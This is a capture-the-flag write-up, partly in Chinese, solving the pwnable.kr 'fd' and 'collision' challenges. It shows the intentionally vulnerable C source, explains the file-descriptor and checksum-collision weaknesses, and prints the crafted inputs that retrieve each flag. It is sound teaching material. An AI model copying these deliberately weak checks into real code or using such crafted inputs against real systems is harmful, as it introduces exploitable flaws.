## [pwnable.kr](http://pwnable.kr/play.php)

* [Toddler's Bottle](#)
    * [fd](#toddlers-bottle---fd)
    * [collision](#toddlers-bottle---collision)

#### Toddler's Bottle - fd

```sh
$ ssh fd@pwnable.kr -p2222 # guest
fd@ubuntu:~$ cat fd.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234; // 文件描述符
    int len = 0;
    len = read(fd, buf, 32);           // 从fd中读取数据（这里理解为标准输入STDIN_FILENO即可）
    if(!strcmp("LETMEWIN\n", buf)){    // 从fd中读到内容为'LETMEWIN\n'
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
```

```sh
fd@ubuntu:~$ ./fd `python -c "print 0x1234"` # stdin
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

扩展学习：[Standard streams](https://en.wikipedia.org/wiki/Standard_streams), [File descriptor](https://en.wikipedia.org/wiki/File_descriptor)

#### Toddler's Bottle - collision

```sh
$ ssh col@pwnable.kr -p2222 # guest
col@ubuntu:~$ cat col.c
```

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;            // 冲突md5
unsigned long check_password(const char* p){    // char 类型为1字节
    int* ip = (int*)p;                          // int 类型为4字节
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];   // 可能溢出, int范围[-2^31, 2^31-1]
                        // 利用此处可能溢出漏洞，从0 --> 2^31-1 --[+1]--> -2^31 --> 0
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){                  // 输入20字节
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
```

分析：

```c
#include <stdio.h>

unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        printf("[%d]: %d\n", i, ip[i]);
        res += ip[i];
    }
    return res;
}

int main(int argc, char *argv[]) {
    char *a = "FFFFFFFFFFFFFFFF\0\0\0\0";               // #1
    // char *a = "FFFFFFFFFFFFFFFF\xd4\xf0\xc3\x08";    // #2
    printf("%ld\n", check_password(a));
    return 0;
}
```

抽取函数 `check_password` 并利用如上代码 **#1** 先计算出 `FFFF FFFF FFFF FFFF \0\0\0\0` 结果

```sh
$ gcc a.c; ./a.out
[0]: 1179010630
[1]: 1179010630
[2]: 1179010630
[3]: 1179010630
[4]: 0
421075224           # FFFFFFFFFFFFFFFF\0\0\0\0
$ python -c "print 0x21DD09EC - 421075224"  # 计算与期望 0x21DD09EC 差值
147058900
$ python -c "print hex(147058900)"          # 获取 \0\0\0\0 应对应的int值
0x8c3f0d4
```

目标机 `col@pwnable.kr` 为小端地址，因此 `0x8c3f0d4` => `\xd4\xf0\xc3\x08`，利用 **#2** 验证结果

```sh
col@ubuntu:~$ ./col `perl -e 'print "FFFFFFFFFFFFFFFF\xd4\xf0\xc3\x08"'`
daddy! I just managed to create a hash collision :)
```

扩展学习：[Integer (computer science)](https://en.wikipedia.org/wiki/Integer_(computer_science))

参考资料：[pwnable-collision](https://etenal.me/archives/972#C3)
